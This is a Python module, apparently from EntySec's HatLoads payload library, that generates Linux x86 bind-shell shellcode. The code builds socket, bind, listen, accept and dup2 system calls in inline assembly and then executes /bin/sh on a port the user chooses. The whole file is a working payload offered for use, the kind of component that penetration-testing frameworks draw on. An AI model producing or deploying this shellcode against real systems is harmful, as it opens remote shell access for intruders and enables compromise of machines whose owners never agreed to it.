#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2022 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from hatasm import HatAsm
from hatvenom import HatVenom

from hatloads.words import Words


class ShellBindTCP(HatAsm, HatVenom, Words):
    def generate(self, assemble=True, options={}):
        if 'BPORT' not in options:
            return b''

        if 'SHELL' in options:
            shell = options['SHELL'].encode()
        else:
            shell = self.shell['sh'].encode()

        shell = [shell[::-1][i:i+4] for i in range(0, len(shell), 4)]
        shell_asm = ""

        for line in shell:
            shell_asm += f"push 0x{line.hex()}\n"

        bport = self.convert_port(options['BPORT'])

        shellcode = f"""
        start:
            xor ebx, ebx
            mul ebx
            push ebx
            inc ebx
            push ebx
            push 0x2
            mov ecx, esp
            mov al, 0x66
            int 0x80

            pop ebx
            pop esi
            push edx
            push 0x{bport.hex()}0002
            push 0x10
            push ecx
            push eax
            mov ecx, esp
            push 0x66
            pop eax
            int 0x80

            mov dword ptr [ecx + 4], eax
            mov bl, 0x4
            mov al, 0x66
            int 0x80

            inc ebx
            mov al, 0x66
            int 0x80

            xchg ebx, eax
            pop ecx

        dup:
            dec ecx
            push 0x3f
            pop eax
            int 0x80

            jns dup
            {shell_asm}
            mov ebx, esp
            push eax
            push ebx
            mov ecx, esp
            mov al, 0xb
            int 0x80
        """

        if assemble:
            return self.assemble('x86', shellcode)
        return shellcode
